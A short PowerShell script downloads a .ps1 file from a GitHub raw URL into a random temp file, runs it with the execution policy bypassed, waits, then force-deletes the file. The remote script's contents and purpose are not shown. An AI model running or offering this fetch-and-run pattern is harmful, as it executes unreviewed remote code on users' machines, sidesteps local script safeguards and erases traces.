$uri = 'https://raw.githubusercontent.com/RamkrishnaSawant/Testing/refs/heads/main/RM4_cod.ps1'

# Create a temporary file path
$tmpPath = Join-Path $env:TEMP ([IO.Path]::GetRandomFileName() + '.ps1')

# Download the remote script
Invoke-WebRequest -Uri $uri -OutFile $tmpPath

# Run the downloaded script in a new PowerShell process
Start-Process -FilePath 'powershell.exe' -ArgumentList @(
    '-ExecutionPolicy', 'Bypass',
    '-NoProfile',
    '-File', $tmpPath
) -Wait

# Clean up
Remove-Item -Path $tmpPath -Force
